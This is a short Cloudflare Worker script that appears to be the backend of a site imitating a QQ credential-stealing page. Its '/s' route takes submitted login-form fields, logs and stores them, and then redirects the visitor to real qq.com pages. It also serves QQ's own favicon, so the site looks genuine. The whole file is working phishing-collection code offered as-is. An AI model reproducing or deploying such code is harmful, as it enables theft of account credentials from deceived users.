const NOT_FOUND_RETURN = "";
const DONT_USE_DEFAULT_404 = true;
const BACKUP_404_URLS = new Array("https://dobby233liu.github.io/cfworker-fake-qqstealer-site/404.html");
const REPORT_DATA = [];
const FAVICON = "https://ssl.zc.qq.com/favicon.ico";
const DEBUG = false;
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

/**
 * Respond to the request
 * @param {Request} request
 */
async function handleRequest(request) {
  var urlObj = new URL(request.url);
  var nf_rep = null;
  switch(urlObj.pathname){
    case "/s":
      var body = await request.text();
      var entries_raw = body.split("&"); // split param
      var found = {};
      for (s in entries_raw){
        var parsit = entries_raw[s].split("="); // split key-value pair
        found[decodeURIComponent(parsit[0])] = decodeURIComponent(parsit[1].replace("+", "%20")); // as space, + = %20
      }
      console.log(found);
      REPORT_DATA[REPORT_DATA.length] = found;
      if (nf_rep != null) break;
      nf_rep = Response.redirect((found["s"] == "登 录" ? "https://ti.qq.com/qq20th" : "https://act.qzone.qq.com"), 301);
      break;
    case "/favicon.ico":
      nf_rep = Response.redirect(FAVICON, 301);
      break;
    default: 
      var temp_notfound = "";
      if(DONT_USE_DEFAULT_404){
        var cont = true;
        for (var i=0;i<BACKUP_404_URLS.length;i++){
          await fetch(new Request(BACKUP_404_URLS[i])).then(function(response) {
            return response.text();
          }).then(function(t){
            temp_notfound = t;
          }).catch((e)=>{
            temp_notfound = e;
            cont = (i>=BACKUP_404_URLS.length-1);
          });
        }
      }else{
        temp_notfound = NOT_FOUND_RETURN;
      }
      nf_rep = new Response(temp_notfound, {
        status: 404,
        headers: new Headers({
          "Content-Type": "text/html"
        })
      });
      break;
  }
  return nf_rep;
}
